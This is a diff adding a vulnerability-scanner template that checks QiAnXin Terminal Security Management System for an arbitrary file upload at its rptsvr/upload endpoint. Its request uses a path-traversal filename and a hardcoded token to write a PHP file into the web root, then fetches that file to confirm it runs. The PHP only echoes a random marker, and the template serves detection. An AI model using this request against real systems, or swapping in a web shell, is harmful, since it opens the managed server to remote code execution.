@@ -1,0 +1,60 @@
+id: qax-terminal-security-management-system-rptsvr-anyfile-upload
+
+info:
+  name: QiAnXin Terminal Security Management System rptsvr Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,exploit
+  description: |
+    The rptsvr endpoint in QiAnXin Terminal Security Management System allows arbitrary file uploads, potentially leading to code execution.
+
+variables:
+  t1: "{{rand_base(32)}}"
+  filename: "{{rand_base(6)}}"
+  boundary: "{{rand_base(29)}}"
+
+flow: "http(1) && http(2)"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/rptsvr/upload"
+    headers:
+      Content-Type: "multipart/form-data; boundary=---------------------------{{boundary}}"
+    body: |
+      -----------------------------{{boundary}}\r\n
+      Content-Disposition: form-data; name="uploadfile"; filename="../../../application/api/controllers/{{filename}}.php"\r\n
+      Content-Type: text/x-python\r\n
+      \r\n
+      <?php\n
+      echo "{{t1}}";\n
+      ?>\r\n
+      -----------------------------{{boundary}}\r\n
+      Content-Disposition: form-data; name="token"\r\n
+      \r\n
+      skylar_report\r\n
+      -----------------------------{{boundary}}--\r\n
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"result":"success", "reason": "uploaded"}'
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/application/api/controllers/{{filename}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t1}}"
